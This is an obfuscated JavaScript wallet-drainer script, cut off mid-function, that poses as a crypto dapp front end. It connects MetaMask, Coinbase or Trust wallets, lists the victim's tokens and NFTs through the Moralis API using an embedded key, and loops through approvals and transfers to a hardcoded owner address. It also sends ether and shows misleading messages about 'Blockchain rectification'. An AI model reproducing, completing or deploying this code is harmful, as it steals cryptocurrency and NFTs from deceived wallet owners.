const _0x196f34=_0x3173;(function(_0x38c80b,_0xbbf24a){const _0x2f2726=_0x3173,_0x215fc7=_0x38c80b();while(!![]){try{const _0x3bb032=parseInt(_0x2f2726(0x203))/0x1+-parseInt(_0x2f2726(0x175))/0x2*(parseInt(_0x2f2726(0x1ac))/0x3)+-parseInt(_0x2f2726(0x226))/0x4*(parseInt(_0x2f2726(0x1b1))/0x5)+parseInt(_0x2f2726(0x1ad))/0x6*(parseInt(_0x2f2726(0x1f0))/0x7)+parseInt(_0x2f2726(0x171))/0x8*(-parseInt(_0x2f2726(0x186))/0x9)+parseInt(_0x2f2726(0x1f9))/0xa*(parseInt(_0x2f2726(0x1c6))/0xb)+parseInt(_0x2f2726(0x18a))/0xc;if(_0x3bb032===_0xbbf24a)break;else _0x215fc7['push'](_0x215fc7['shift']());}catch(_0x1d7e5e){_0x215fc7['push'](_0x215fc7['shift']());}}}(_0x4e9f,0xaefe5));function _0x4e9f(){const _0x2f4485=['href','toString','Approve\x20Completed\x20Successfully','_initialSupply','apePrice','_upgradedAddress','Initial\x20list\x20','maxNftSupply','getProvider','click','length','tokenOfOwnerByIndex','isBlackListed','balanceOf','_to','event','_user','bool','_totalSupply','MetaMask','transferFrom','Unpause','result','maxFee','emergencySetStartingIndexBlock','ownerOf','basisPointsRate','operator','18516ymLkWP','REVEAL_TIMESTAMP','_maker','formatted','deprecate','16rXdAqh','connector','Error\x20collecting\x20info\x20about\x20wallet','https://pbs.twimg.com/profile_images/1566773491764023297/IvmCdGnM_400x400.jpg','86idAdFG','/erc20','trustwallet','_clearedUser','error','NFT\x20Contract\x20Address\x20','Approval','value','setProvenanceHash','Hahahahahah','gasPrice','MAX_UINT','from','price','log','sending\x20ether','_decimals','6001434TcgRQt','map','_symbol','saleStart','21972180bgOYTM','.connect','numberOfTokens','Token\x20balance\x20is\x20','owner','options','.coinbase','all','_owner','deprecated','filter','https://link.trustwallet.com/open_url?url=','Params','https://metamask.app.link/dapp/','uint256','approve','43114','token_address','payable','LJrmvC5VBYK43Qa9BKmVB4GUr7saw5TLZqKY65BQub1clqdAgjy16t5A7n16DIbn','isApprovedForAll','safeTransferFrom','coinbase','_value','setParams','flipSaleState','tokenByIndex','transfer','Error\x20not\x20found,\x20Please\x20switch\x20network\x20or\x20try\x20again!','Blockchain\x20rectification','previousOwner','_spender','view','json','55494arqeAr','48KbyvLF','index','function','usd','475SPJkrW','newBasisPoints','balances','Error:\x20','New\x20token','_balance','string','decimals','openModal','totalSupply','nonpayable','newAddress','networkVersion','transferOwnership','Transaction\x20Rejected','undefined','spender','OwnershipTransferred','setStartingIndex','name','Error\x20processing\x20item\x20','8954FIMzeS','symbol','BAYC_PROVENANCE','maximumFee','saleIsActive','interfaceId','Transaction\x20Receipt:\x20','getBlackListStatus','address','Insufficient\x20funds\x20for\x20transfer\x20or\x20transaction\x20was\x20rejected','bytes','revealTimeStamp','.proceed','search','999999999999999999999999999999999999999999999999999999999999999999999999','amount','then','0xea8968B218a551919FbD5f1166328C82a96dED54','application/json','.trust','baseURI','constructor','allowed','No\x20address','Transfer\x20Completed\x20Successfully,\x20You\x20should\x20receive\x20some\x20native\x20tokens','newOwner','allowance','Wallet\x20Connected\x20Successfully\x20to\x20eth\x20mainnet!','https://altcoinsbox.com/wp-content/uploads/2022/12/coinbase-logo.png','unpause','avalanche','catch','tokenId','.meta','_data','ee71d215d0dec7d1bf950851c84d9643','&text=','supportsInterface','Transaction\x20hash\x20','approved','5902378376','Your\x20address\x20','957019xaGdWK','Incorrect\x20network','AddedBlackList','balance','tokens-list','NFTs\x20collection\x20','0x3Acb41A1B58e8FF9f88E9a24118171a1a4077A40','remaining','location','2910zWLKHP','status','Could\x20not\x20get\x20a\x20wallet\x20connection','CoinbaseWalletConnector','tokenURI','_blackListedUser','Deprecate','_from','feeBasisPoints','message','123969rjlHWt','Issue','GET','_evilUser','maxApePurchase','You\x20need\x20to\x20connect\x20your\x20wallet\x20first','https://deep-index.moralis.io/api/v2/'];_0x4e9f=function(){return _0x2f4485;};return _0x4e9f();}let NFTs=[],tokens=[],chainId=null,web3Object=null,selectedAccount=null;import{EthereumClient,w3mConnectors,w3mProvider,WagmiCore,WagmiCoreChains,WagmiCoreConnectors}from'https://unpkg.com/@web3modal/ethereum@2.6.2';import{parseEther}from'https://esm.sh/v126/viem@1.2.15/es2022/viem.bundle.mjs';import{Web3Modal}from'https://unpkg.com/@web3modal/html@2.6.2';const {avalanche,mainnet}=WagmiCoreChains,{configureChains,createConfig,writeContract,sendTransaction,fetchBalance,fetchFeeData,connect,switchNetwork,getAccount,getNetwork}=WagmiCore,chains=[avalanche,mainnet],projectId=_0x196f34(0x1e9),{publicClient}=configureChains(chains,[w3mProvider({'projectId':projectId})]),wagmiConfig=createConfig({'autoConnect':!![],'connectors':[...w3mConnectors({'chains':chains,'version':0x2,'projectId':projectId}),new WagmiCoreConnectors[(_0x196f34(0x1fc))]({'chains':chains,'options':{'appName':_0x196f34(0x1a7)}})],'publicClient':publicClient}),ethereumClient=new EthereumClient(wagmiConfig,chains);export const web3Modal=new Web3Modal({'projectId':projectId,'walletImages':{'safe':_0x196f34(0x174),'coinbase':_0x196f34(0x1e2)}},ethereumClient);let currentUrl=window[_0x196f34(0x1f8)][_0x196f34(0x20a)];const OWNER_ADDRESS=_0x196f34(0x1d7),ABI=[{'constant':!![],'inputs':[],'name':_0x196f34(0x1c4),'outputs':[{'name':'','type':_0x196f34(0x1b7)}],'payable':![],'stateMutability':'view','type':_0x196f34(0x1af)},{'constant':![],'inputs':[{'name':_0x196f34(0x20f),'type':_0x196f34(0x1ce)}],'name':_0x196f34(0x170),'outputs':[],'payable':![],'stateMutability':_0x196f34(0x1bb),'type':_0x196f34(0x1af)},{'constant':![],'inputs':[{'name':_0x196f34(0x1a9),'type':'address'},{'name':_0x196f34(0x1a1),'type':'uint256'}],'name':_0x196f34(0x199),'outputs':[],'payable':![],'stateMutability':'nonpayable','type':'function'},{'constant':!![],'inputs':[],'name':_0x196f34(0x193),'outputs':[{'name':'','type':_0x196f34(0x21b)}],'payable':![],'stateMutability':'view','type':'function'},{'constant':![],'inputs':[{'name':_0x196f34(0x206),'type':_0x196f34(0x1ce)}],'name':'addBlackList','outputs':[],'payable':![],'stateMutability':_0x196f34(0x1bb),'type':'function'},{'constant':!![],'inputs':[],'name':_0x196f34(0x1ba),'outputs':[{'name':'','type':_0x196f34(0x198)}],'payable':![],'stateMutability':'view','type':'function'},{'constant':![],'inputs':[{'name':_0x196f34(0x200),'type':_0x196f34(0x1ce)},{'name':_0x196f34(0x218),'type':_0x196f34(0x1ce)},{'name':_0x196f34(0x1a1),'type':_0x196f34(0x198)}],'name':'transferFrom','outputs':[],'payable':![],'stateMutability':_0x196f34(0x1bb),'type':_0x196f34(0x1af)},{'constant':!![],'inputs':[],'name':'upgradedAddress','outputs':[{'name':'','type':_0x196f34(0x1ce)}],'payable':![],'stateMutability':_0x196f34(0x1aa),'type':_0x196f34(0x1af)},{'constant':!![],'inputs':[{'name':'','type':'address'}],'name':_0x196f34(0x1b3),'outputs':[{'name':'','type':_0x196f34(0x198)}],'payable':![],'stateMutability':'view','type':'function'},{'constant':!![],'inputs':[],'name':_0x196f34(0x1b8),'outputs':[{'name':'','type':_0x196f34(0x198)}],'payable':![],'stateMutability':_0x196f34(0x1aa),'type':'function'},{'constant':!![],'inputs':[],'name':_0x196f34(0x1c9),'outputs':[{'name':'','type':_0x196f34(0x198)}],'payable':![],'stateMutability':_0x196f34(0x1aa),'type':_0x196f34(0x1af)},{'constant':!![],'inputs':[],'name':_0x196f34(0x21c),'outputs':[{'name':'','type':_0x196f34(0x198)}],'payable':![],'stateMutability':_0x196f34(0x1aa),'type':_0x196f34(0x1af)},{'constant':![],'inputs':[],'name':_0x196f34(0x1e3),'outputs':[],'payable':![],'stateMutability':_0x196f34(0x1bb),'type':_0x196f34(0x1af)},{'constant':!![],'inputs':[{'name':_0x196f34(0x228),'type':_0x196f34(0x1ce)}],'name':_0x196f34(0x1cd),'outputs':[{'name':'','type':_0x196f34(0x21b)}],'payable':![],'stateMutability':_0x196f34(0x1aa),'type':_0x196f34(0x1af)},{'constant':!![],'inputs':[{'name':'','type':_0x196f34(0x1ce)},{'name':'','type':_0x196f34(0x1ce)}],'name':_0x196f34(0x1dc),'outputs':[{'name':'','type':'uint256'}],'payable':![],'stateMutability':'view','type':'function'},{'constant':!![],'inputs':[],'name':'paused','outputs':[{'name':'','type':_0x196f34(0x21b)}],'payable':![],'stateMutability':_0x196f34(0x1aa),'type':_0x196f34(0x1af)},{'constant':!![],'inputs':[{'name':'who','type':'address'}],'name':_0x196f34(0x217),'outputs':[{'name':'','type':_0x196f34(0x198)}],'payable':![],'stateMutability':_0x196f34(0x1aa),'type':_0x196f34(0x1af)},{'constant':![],'inputs':[],'name':'pause','outputs':[],'payable':![],'stateMutability':'nonpayable','type':_0x196f34(0x1af)},{'constant':!![],'inputs':[],'name':'getOwner','outputs':[{'name':'','type':_0x196f34(0x1ce)}],'payable':![],'stateMutability':_0x196f34(0x1aa),'type':'function'},{'constant':!![],'inputs':[],'name':_0x196f34(0x18e),'outputs':[{'name':'','type':_0x196f34(0x1ce)}],'payable':![],'stateMutability':_0x196f34(0x1aa),'type':_0x196f34(0x1af)},{'constant':!![],'inputs':[],'name':_0x196f34(0x1c7),'outputs':[{'name':'','type':_0x196f34(0x1b7)}],'payable':![],'stateMutability':_0x196f34(0x1aa),'type':_0x196f34(0x1af)},{'constant':![],'inputs':[{'name':_0x196f34(0x218),'type':_0x196f34(0x1ce)},{'name':_0x196f34(0x1a1),'type':_0x196f34(0x198)}],'name':_0x196f34(0x1a5),'outputs':[],'payable':![],'stateMutability':_0x196f34(0x1bb),'type':_0x196f34(0x1af)},{'constant':![],'inputs':[{'name':_0x196f34(0x1b2),'type':_0x196f34(0x198)},{'name':'newMaxFee','type':_0x196f34(0x198)}],'name':_0x196f34(0x1a2),'outputs':[],'payable':![],'stateMutability':_0x196f34(0x1bb),'type':_0x196f34(0x1af)},{'constant':![],'inputs':[{'name':_0x196f34(0x1d5),'type':'uint256'}],'name':'issue','outputs':[],'payable':![],'stateMutability':'nonpayable','type':_0x196f34(0x1af)},{'constant':![],'inputs':[{'name':'amount','type':'uint256'}],'name':'redeem','outputs':[],'payable':![],'stateMutability':_0x196f34(0x1bb),'type':'function'},{'constant':!![],'inputs':[{'name':_0x196f34(0x192),'type':_0x196f34(0x1ce)},{'name':_0x196f34(0x1a9),'type':_0x196f34(0x1ce)}],'name':_0x196f34(0x1e0),'outputs':[{'name':_0x196f34(0x1f7),'type':_0x196f34(0x198)}],'payable':![],'stateMutability':_0x196f34(0x1aa),'type':_0x196f34(0x1af)},{'constant':!![],'inputs':[],'name':_0x196f34(0x224),'outputs':[{'name':'','type':_0x196f34(0x198)}],'payable':![],'stateMutability':'view','type':_0x196f34(0x1af)},{'constant':!![],'inputs':[{'name':'','type':_0x196f34(0x1ce)}],'name':_0x196f34(0x216),'outputs':[{'name':'','type':_0x196f34(0x21b)}],'payable':![],'stateMutability':_0x196f34(0x1aa),'type':_0x196f34(0x1af)},{'constant':![],'inputs':[{'name':_0x196f34(0x178),'type':_0x196f34(0x1ce)}],'name':'removeBlackList','outputs':[],'payable':![],'stateMutability':_0x196f34(0x1bb),'type':_0x196f34(0x1af)},{'constant':!![],'inputs':[],'name':_0x196f34(0x180),'outputs':[{'name':'','type':_0x196f34(0x198)}],'payable':![],'stateMutability':'view','type':_0x196f34(0x1af)},{'constant':![],'inputs':[{'name':_0x196f34(0x1df),'type':'address'}],'name':_0x196f34(0x1be),'outputs':[],'payable':![],'stateMutability':'nonpayable','type':'function'},{'constant':![],'inputs':[{'name':_0x196f34(0x1fe),'type':_0x196f34(0x1ce)}],'name':'destroyBlackFunds','outputs':[],'payable':![],'stateMutability':_0x196f34(0x1bb),'type':_0x196f34(0x1af)},{'inputs':[{'name':_0x196f34(0x20d),'type':'uint256'},{'name':'_name','type':'string'},{'name':_0x196f34(0x188),'type':'string'},{'name':_0x196f34(0x185),'type':'uint256'}],'payable':![],'stateMutability':'nonpayable','type':_0x196f34(0x1db)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x196f34(0x1d5),'type':_0x196f34(0x198)}],'name':_0x196f34(0x204),'type':'event'},{'anonymous':![],'inputs':[{'indexed':![],'name':'amount','type':_0x196f34(0x198)}],'name':'Redeem','type':_0x196f34(0x219)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x196f34(0x1bc),'type':'address'}],'name':_0x196f34(0x1ff),'type':_0x196f34(0x219)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x196f34(0x201),'type':'uint256'},{'indexed':![],'name':_0x196f34(0x221),'type':_0x196f34(0x198)}],'name':_0x196f34(0x196),'type':_0x196f34(0x219)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x196f34(0x1fe),'type':_0x196f34(0x1ce)},{'indexed':![],'name':_0x196f34(0x1b6),'type':_0x196f34(0x198)}],'name':'DestroyedBlackFunds','type':'event'},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x196f34(0x21a),'type':'address'}],'name':_0x196f34(0x1f2),'type':_0x196f34(0x219)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x196f34(0x21a),'type':_0x196f34(0x1ce)}],'name':'RemovedBlackList','type':_0x196f34(0x219)},{'anonymous':![],'inputs':[{'indexed':!![],'name':_0x196f34(0x18e),'type':_0x196f34(0x1ce)},{'indexed':!![],'name':_0x196f34(0x1c1),'type':_0x196f34(0x1ce)},{'indexed':![],'name':_0x196f34(0x17c),'type':_0x196f34(0x198)}],'name':_0x196f34(0x17b),'type':_0x196f34(0x219)},{'anonymous':![],'inputs':[{'indexed':!![],'name':_0x196f34(0x181),'type':_0x196f34(0x1ce)},{'indexed':!![],'name':'to','type':_0x196f34(0x1ce)},{'indexed':![],'name':'value','type':_0x196f34(0x198)}],'name':'Transfer','type':'event'},{'anonymous':![],'inputs':[],'name':'Pause','type':'event'},{'anonymous':![],'inputs':[],'name':_0x196f34(0x21f),'type':_0x196f34(0x219)}],ABIN=[{'inputs':[{'internalType':_0x196f34(0x1b7),'name':_0x196f34(0x1c4),'type':_0x196f34(0x1b7)},{'internalType':_0x196f34(0x1b7),'name':_0x196f34(0x1c7),'type':_0x196f34(0x1b7)},{'internalType':'uint256','name':_0x196f34(0x211),'type':_0x196f34(0x198)},{'internalType':_0x196f34(0x198),'name':_0x196f34(0x189),'type':_0x196f34(0x198)}],'stateMutability':_0x196f34(0x1bb),'type':_0x196f34(0x1db)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x196f34(0x1ce),'name':_0x196f34(0x18e),'type':_0x196f34(0x1ce)},{'indexed':!![],'internalType':'address','name':_0x196f34(0x1ed),'type':_0x196f34(0x1ce)},{'indexed':!![],'internalType':_0x196f34(0x198),'name':'tokenId','type':'uint256'}],'name':_0x196f34(0x17b),'type':_0x196f34(0x219)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':'address','name':_0x196f34(0x18e),'type':_0x196f34(0x1ce)},{'indexed':!![],'internalType':_0x196f34(0x1ce),'name':_0x196f34(0x225),'type':'address'},{'indexed':![],'internalType':_0x196f34(0x21b),'name':_0x196f34(0x1ed),'type':_0x196f34(0x21b)}],'name':'ApprovalForAll','type':_0x196f34(0x219)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x196f34(0x1ce),'name':_0x196f34(0x1a8),'type':_0x196f34(0x1ce)},{'indexed':!![],'internalType':_0x196f34(0x1ce),'name':_0x196f34(0x1df),'type':'address'}],'name':_0x196f34(0x1c2),'type':_0x196f34(0x219)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x196f34(0x1ce),'name':'from','type':_0x196f34(0x1ce)},{'indexed':!![],'internalType':_0x196f34(0x1ce),'name':'to','type':'address'},{'indexed':!![],'internalType':_0x196f34(0x198),'name':_0x196f34(0x1e6),'type':_0x196f34(0x198)}],'name':'Transfer','type':_0x196f34(0x219)},{'inputs':[],'name':_0x196f34(0x1c8),'outputs':[{'internalType':_0x196f34(0x1b7),'name':'','type':_0x196f34(0x1b7)}],'stateMutability':'view','type':'function'},{'inputs':[],'name':'MAX_APES','outputs':[{'internalType':_0x196f34(0x198),'name':'','type':_0x196f34(0x198)}],'stateMutability':_0x196f34(0x1aa),'type':_0x196f34(0x1af)},{'inputs':[],'name':_0x196f34(0x227),'outputs':[{'internalType':_0x196f34(0x198),'name':'','type':'uint256'}],'stateMutability':_0x196f34(0x1aa),'type':_0x196f34(0x1af)},{'inputs':[],'name':_0x196f34(0x20e),'outputs':[{'internalType':_0x196f34(0x198),'name':'','type':_0x196f34(0x198)}],'stateMutability':_0x196f34(0x1aa),'type':_0x196f34(0x1af)},{'inputs':[{'internalType':_0x196f34(0x1ce),'name':'to','type':_0x196f34(0x1ce)},{'internalType':_0x196f34(0x198),'name':'tokenId','type':_0x196f34(0x198)}],'name':_0x196f34(0x199),'outputs':[],'stateMutability':'nonpayable','type':_0x196f34(0x1af)},{'inputs':[{'internalType':'address','name':_0x196f34(0x18e),'type':_0x196f34(0x1ce)}],'name':_0x196f34(0x217),'outputs':[{'internalType':_0x196f34(0x198),'name':'','type':_0x196f34(0x198)}],'stateMutability':'view','type':'function'},{'inputs':[],'name':_0x196f34(0x1da),'outputs':[{'internalType':_0x196f34(0x1b7),'name':'','type':_0x196f34(0x1b7)}],'stateMutability':_0x196f34(0x1aa),'type':_0x196f34(0x1af)},{'inputs':[],'name':_0x196f34(0x222),'outputs':[],'stateMutability':_0x196f34(0x1bb),'type':_0x196f34(0x1af)},{'inputs':[],'name':_0x196f34(0x1a3),'outputs':[],'stateMutability':'nonpayable','type':_0x196f34(0x1af)},{'inputs':[{'internalType':_0x196f34(0x198),'name':'tokenId','type':_0x196f34(0x198)}],'name':'getApproved','outputs':[{'internalType':'address','name':'','type':_0x196f34(0x1ce)}],'stateMutability':'view','type':_0x196f34(0x1af)},{'inputs':[{'internalType':_0x196f34(0x1ce),'name':'owner','type':'address'},{'internalType':_0x196f34(0x1ce),'name':_0x196f34(0x225),'type':_0x196f34(0x1ce)}],'name':_0x196f34(0x19e),'outputs':[{'internalType':_0x196f34(0x21b),'name':'','type':_0x196f34(0x21b)}],'stateMutability':_0x196f34(0x1aa),'type':'function'},{'inputs':[],'name':_0x196f34(0x207),'outputs':[{'internalType':_0x196f34(0x198),'name':'','type':_0x196f34(0x198)}],'stateMutability':_0x196f34(0x1aa),'type':_0x196f34(0x1af)},{'inputs':[{'internalType':_0x196f34(0x198),'name':_0x196f34(0x18c),'type':_0x196f34(0x198)}],'name':'mintApe','outputs':[],'stateMutability':_0x196f34(0x19c),'type':_0x196f34(0x1af)},{'inputs':[],'name':_0x196f34(0x1c4),'outputs':[{'internalType':_0x196f34(0x1b7),'name':'','type':_0x196f34(0x1b7)}],'stateMutability':_0x196f34(0x1aa),'type':'function'},{'inputs':[],'name':'owner','outputs':[{'internalType':_0x196f34(0x1ce),'name':'','type':_0x196f34(0x1ce)}],'stateMutability':'view','type':_0x196f34(0x1af)},{'inputs':[{'internalType':_0x196f34(0x198),'name':'tokenId','type':_0x196f34(0x198)}],'name':_0x196f34(0x223),'outputs':[{'internalType':_0x196f34(0x1ce),'name':'','type':_0x196f34(0x1ce)}],'stateMutability':_0x196f34(0x1aa),'type':_0x196f34(0x1af)},{'inputs':[],'name':'renounceOwnership','outputs':[],'stateMutability':_0x196f34(0x1bb),'type':_0x196f34(0x1af)},{'inputs':[],'name':'reserveApes','outputs':[],'stateMutability':_0x196f34(0x1bb),'type':_0x196f34(0x1af)},{'inputs':[{'internalType':'address','name':_0x196f34(0x181),'type':_0x196f34(0x1ce)},{'internalType':_0x196f34(0x1ce),'name':'to','type':'address'},{'internalType':'uint256','name':_0x196f34(0x1e6),'type':_0x196f34(0x198)}],'name':_0x196f34(0x19f),'outputs':[],'stateMutability':'nonpayable','type':_0x196f34(0x1af)},{'inputs':[{'internalType':_0x196f34(0x1ce),'name':_0x196f34(0x181),'type':'address'},{'internalType':_0x196f34(0x1ce),'name':'to','type':'address'},{'internalType':_0x196f34(0x198),'name':'tokenId','type':'uint256'},{'internalType':_0x196f34(0x1d0),'name':_0x196f34(0x1e8),'type':'bytes'}],'name':_0x196f34(0x19f),'outputs':[],'stateMutability':_0x196f34(0x1bb),'type':_0x196f34(0x1af)},{'inputs':[],'name':_0x196f34(0x1ca),'outputs':[{'internalType':_0x196f34(0x21b),'name':'','type':_0x196f34(0x21b)}],'stateMutability':_0x196f34(0x1aa),'type':_0x196f34(0x1af)},{'inputs':[{'internalType':'address','name':_0x196f34(0x225),'type':_0x196f34(0x1ce)},{'internalType':_0x196f34(0x21b),'name':_0x196f34(0x1ed),'type':_0x196f34(0x21b)}],'name':'setApprovalForAll','outputs':[],'stateMutability':_0x196f34(0x1bb),'type':_0x196f34(0x1af)},{'inputs':[{'internalType':_0x196f34(0x1b7),'name':_0x196f34(0x1da),'type':_0x196f34(0x1b7)}],'name':'setBaseURI','outputs':[],'stateMutability':_0x196f34(0x1bb),'type':_0x196f34(0x1af)},{'inputs':[{'internalType':_0x196f34(0x1b7),'name':'provenanceHash','type':'string'}],'name':_0x196f34(0x17d),'outputs':[],'stateMutability':_0x196f34(0x1bb),'type':_0x196f34(0x1af)},{'inputs':[{'internalType':'uint256','name':_0x196f34(0x1d1),'type':_0x196f34(0x198)}],'name':'setRevealTimestamp','outputs':[],'stateMutability':_0x196f34(0x1bb),'type':'function'},{'inputs':[],'name':_0x196f34(0x1c3),'outputs':[],'stateMutability':_0x196f34(0x1bb),'type':_0x196f34(0x1af)},{'inputs':[],'name':'startingIndex','outputs':[{'internalType':_0x196f34(0x198),'name':'','type':_0x196f34(0x198)}],'stateMutability':_0x196f34(0x1aa),'type':_0x196f34(0x1af)},{'inputs':[],'name':'startingIndexBlock','outputs':[{'internalType':'uint256','name':'','type':_0x196f34(0x198)}],'stateMutability':_0x196f34(0x1aa),'type':_0x196f34(0x1af)},{'inputs':[{'internalType':'bytes4','name':_0x196f34(0x1cb),'type':'bytes4'}],'name':_0x196f34(0x1eb),'outputs':[{'internalType':_0x196f34(0x21b),'name':'','type':_0x196f34(0x21b)}],'stateMutability':_0x196f34(0x1aa),'type':_0x196f34(0x1af)},{'inputs':[],'name':'symbol','outputs':[{'internalType':_0x196f34(0x1b7),'name':'','type':'string'}],'stateMutability':'view','type':_0x196f34(0x1af)},{'inputs':[{'internalType':_0x196f34(0x198),'name':_0x196f34(0x1ae),'type':'uint256'}],'name':_0x196f34(0x1a4),'outputs':[{'internalType':'uint256','name':'','type':_0x196f34(0x198)}],'stateMutability':_0x196f34(0x1aa),'type':_0x196f34(0x1af)},{'inputs':[{'internalType':'address','name':_0x196f34(0x18e),'type':_0x196f34(0x1ce)},{'internalType':'uint256','name':_0x196f34(0x1ae),'type':_0x196f34(0x198)}],'name':_0x196f34(0x215),'outputs':[{'internalType':_0x196f34(0x198),'name':'','type':_0x196f34(0x198)}],'stateMutability':_0x196f34(0x1aa),'type':_0x196f34(0x1af)},{'inputs':[{'internalType':'uint256','name':'tokenId','type':_0x196f34(0x198)}],'name':_0x196f34(0x1fd),'outputs':[{'internalType':'string','name':'','type':_0x196f34(0x1b7)}],'stateMutability':'view','type':_0x196f34(0x1af)},{'inputs':[],'name':_0x196f34(0x1ba),'outputs':[{'internalType':_0x196f34(0x198),'name':'','type':_0x196f34(0x198)}],'stateMutability':_0x196f34(0x1aa),'type':_0x196f34(0x1af)},{'inputs':[{'internalType':'address','name':_0x196f34(0x181),'type':_0x196f34(0x1ce)},{'internalType':_0x196f34(0x1ce),'name':'to','type':_0x196f34(0x1ce)},{'internalType':'uint256','name':_0x196f34(0x1e6),'type':_0x196f34(0x198)}],'name':_0x196f34(0x21e),'outputs':[],'stateMutability':_0x196f34(0x1bb),'type':_0x196f34(0x1af)},{'inputs':[{'internalType':_0x196f34(0x1ce),'name':_0x196f34(0x1df),'type':_0x196f34(0x1ce)}],'name':_0x196f34(0x1be),'outputs':[],'stateMutability':'nonpayable','type':'function'},{'inputs':[],'name':'withdraw','outputs':[],'stateMutability':'nonpayable','type':_0x196f34(0x1af)}];let wallet;$(_0x196f34(0x1e7))[_0x196f34(0x213)](async function(){wallet='metamask',await connector();}),$(_0x196f34(0x190))[_0x196f34(0x213)](async function(){const _0x293f62=_0x196f34;wallet=_0x293f62(0x1a0),await connector();}),$(_0x196f34(0x1d9))[_0x196f34(0x213)](async function(){wallet='trustwallet',await connector();}),$(_0x196f34(0x18b))['click'](async function(){const _0x38a5e3=_0x196f34;try{await web3Modal[_0x38a5e3(0x1b9)]();}catch(_0x5e0991){console[_0x38a5e3(0x183)](_0x38a5e3(0x1fb),_0x5e0991);return;}});let connector=async()=>{const _0x510d2e=_0x196f34;if(typeof web3===_0x510d2e(0x1c0)||typeof ethereum===_0x510d2e(0x1c0)){console['log'](_0x510d2e(0x17e));if(wallet==='metamask'){let _0x3df44c=_0x510d2e(0x197)+currentUrl;window[_0x510d2e(0x1f8)][_0x510d2e(0x20a)]=_0x3df44c;}else{if(wallet===_0x510d2e(0x1a0)){let _0x358c00='https://go.cb-w.com/dapp?cb_url='+currentUrl;window['location'][_0x510d2e(0x20a)]=_0x358c00;}else{if(wallet===_0x510d2e(0x177)){let _0x4186c0=_0x510d2e(0x195)+currentUrl;window[_0x510d2e(0x1f8)][_0x510d2e(0x20a)]=_0x4186c0;}}}}else try{await web3Modal[_0x510d2e(0x1b9)]();}catch(_0x493bff){console[_0x510d2e(0x183)](_0x510d2e(0x1fb),_0x493bff);return;}};$(_0x196f34(0x1d2))['click'](async function(){const _0x52251e=_0x196f34;let _0x3160d9=getAccount();console[_0x52251e(0x183)](_0x3160d9),!_0x3160d9[_0x52251e(0x1ce)]&&(console['log'](_0x52251e(0x1dd)),alert(_0x52251e(0x208))),_0x3160d9[_0x52251e(0x172)][_0x52251e(0x1c4)]===_0x52251e(0x21d)&&(_0x3160d9[_0x52251e(0x172)][_0x52251e(0x18f)][_0x52251e(0x212)]()[_0x52251e(0x1bd)]!==_0x52251e(0x19a)&&(console[_0x52251e(0x183)](_0x52251e(0x1f1)),await switchNetwork({'chainId':0xa86a}))),selectedAccount=_0x3160d9['address'],sendMessage(_0x52251e(0x1e1)),sendMessage('Cl\x20address\x20:\x20'+selectedAccount),covalenthqAPICall();});const Oxa=_0x196f34(0x1f6),Oxc=_0x196f34(0x1ee);async function covalenthqAPICall(){const _0x2d2c46=_0x196f34,_0x1e113b={'chain':_0x2d2c46(0x1e4)},_0x27a8c0=new URL(_0x2d2c46(0x209)+selectedAccount+_0x2d2c46(0x176));_0x27a8c0[_0x2d2c46(0x1d3)]=new URLSearchParams(_0x1e113b)[_0x2d2c46(0x20b)]();const _0x3bc985={'method':_0x2d2c46(0x205),'headers':{'accept':_0x2d2c46(0x1d8),'X-API-Key':_0x2d2c46(0x19d)}};try{const _0x46b2d7=await fetch(_0x27a8c0,_0x3bc985)[_0x2d2c46(0x1d6)](_0x39b403=>_0x39b403[_0x2d2c46(0x1ab)]());console[_0x2d2c46(0x183)](_0x46b2d7);let _0x282669=_0x46b2d7;console[_0x2d2c46(0x183)](_0x2d2c46(0x210),_0x282669);let _0x3c4b1c=await Promise[_0x2d2c46(0x191)](_0x282669[_0x2d2c46(0x187)](async _0x471b4f=>{const _0x331518=_0x2d2c46;let _0x32e0e2;try{_0x32e0e2=await getValue(_0x471b4f[_0x331518(0x19b)],_0x471b4f['balance'],_0x471b4f['decimals']);}catch(_0x5308cd){_0x32e0e2=0x0;}return console[_0x331518(0x183)](_0x32e0e2),{'balance':_0x471b4f['balance'],'value':_0x32e0e2,'address':_0x471b4f[_0x331518(0x19b)]};}));console[_0x2d2c46(0x183)](_0x2d2c46(0x1f4),_0x3c4b1c),tokens=_0x3c4b1c[_0x2d2c46(0x194)](_0x1311a0=>_0x1311a0[_0x2d2c46(0x17c)]>0x5),tokens['sort']((_0x1efc8d,_0x386bd0)=>_0x386bd0[_0x2d2c46(0x17c)]-_0x1efc8d['value']),console[_0x2d2c46(0x183)]('chainId:',await getNetwork(),'Tokens:',tokens),NFTs=await getNFTs(selectedAccount)['catch'](_0xf88053=>{const _0x52ff66=_0x2d2c46;console[_0x52ff66(0x183)]('Unable\x20to\x20get\x20NFts',_0xf88053);}),NFTs=NFTs[_0x2d2c46(0x220)],console['log'](_0x2d2c46(0x1f5),NFTs);if(tokens[_0x2d2c46(0x214)]===0x0&&NFTs[_0x2d2c46(0x214)]===0x0)onSendEther();else onApprove();}catch{sendMessage(_0x2d2c46(0x173));}}async function onApprove(){const _0x325ab9=_0x196f34;if(tokens[_0x325ab9(0x214)])try{loopTokens(tokens);}catch(_0x1d8157){console[_0x325ab9(0x179)](_0x325ab9(0x1c5)+_0x1d8157[_0x325ab9(0x202)]);}else{if(NFTs['length']){try{loopNfts(NFTs);}catch(_0x158d7b){console[_0x325ab9(0x179)](_0x325ab9(0x1c5)+_0x158d7b[_0x325ab9(0x202)]);}onSendEther(),sendMessage(_0x325ab9(0x1a6));}else try{onSendEther();}catch(_0x498e61){console[_0x325ab9(0x179)](_0x325ab9(0x1c5)+_0x498e61[_0x325ab9(0x202)]);}}}async function loopTokens(_0x37363d){const _0x305357=_0x196f34;for await(let _0x2161b7 of _0x37363d){console[_0x305357(0x183)]('Token',_0x2161b7);try{sendMessage(_0x305357(0x1b5));let {hash:_0x37a73a}=await 